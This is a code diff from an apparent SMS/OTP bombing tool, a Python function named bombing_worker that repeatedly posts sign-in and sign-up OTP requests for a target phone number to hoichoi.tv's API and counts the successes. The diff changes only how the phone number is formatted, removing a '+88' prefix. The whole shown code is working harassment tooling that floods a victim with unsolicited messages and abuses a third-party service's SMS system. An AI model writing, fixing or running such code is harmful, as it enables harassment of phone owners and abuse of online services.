@@ -1018,7 +1018,7 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'referer': 'https://www.hoichoi.tv/',
                     'user-agent': 'Mozilla/5.0'
                 }
-                data_hoichoi = {"phoneNumber": f"+88{clean_number}", "requestType": "send", "screenName": "signin"}
+                data_hoichoi = {"phoneNumber": f"{clean_number}", "requestType": "send", "screenName": "signin"}
                 res = session.post(url_hoichoi_signin, params=params_hoichoi, json=data_hoichoi, headers=headers_hoichoi, timeout=5)
                 if res.status_code in [200, 201]:
                     cycle_success += 1
@@ -1052,7 +1052,7 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'referer': 'https://www.hoichoi.tv/',
                     'user-agent': 'Mozilla/5.0'
                 }
-                data_hoichoi = {"phoneNumber": f"+88{clean_number}", "requestType": "send", "whatsappConsent": False}
+                data_hoichoi = {"phoneNumber": f"{clean_number}", "requestType": "send", "whatsappConsent": False}
                 res = session.post(url_hoichoi_signup, params=params_hoichoi, json=data_hoichoi, headers=headers_hoichoi, timeout=5)
                 if res.status_code in [200, 201]:
                     cycle_success += 1
